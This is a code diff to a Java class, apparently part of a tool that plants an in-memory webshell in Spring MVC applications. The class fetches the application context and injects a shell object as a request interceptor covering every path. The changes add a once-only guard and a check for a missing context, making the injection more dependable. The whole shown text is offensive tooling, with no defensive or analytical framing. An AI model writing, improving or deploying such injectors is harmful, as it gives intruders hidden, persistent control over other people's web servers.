@@ -17,6 +17,7 @@ import java.util.zip.GZIPInputStream;
 public class SpringWebMvcInterceptorInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getClassName() {
         return "{{className}}";
@@ -27,20 +28,28 @@ public class SpringWebMvcInterceptorInjector {
     }
 
     public SpringWebMvcInterceptorInjector() {
+        if (ok) {
+            return;
+        }
         Object context = null;
         try {
             context = getContext();
         } catch (Throwable e) {
             msg += "context error: " + getErrorMessage(e);
         }
-        try {
-            Object shell = getShell();
-            msg += "context: [" + context + "] ";
-            inject(context, shell);
-            msg += "[/*] ready\n";
-        } catch (Throwable e) {
-            msg += "failed " + getErrorMessage(e) + "\n";
+        if (context == null) {
+            msg += "context not found";
+        } else {
+            try {
+                Object shell = getShell();
+                msg += "context: [" + context + "] ";
+                inject(context, shell);
+                msg += "[/*] ready\n";
+            } catch (Throwable e) {
+                msg += "failed " + getErrorMessage(e) + "\n";
+            }
         }
+        ok = true;
         System.out.println(msg);
     }
 
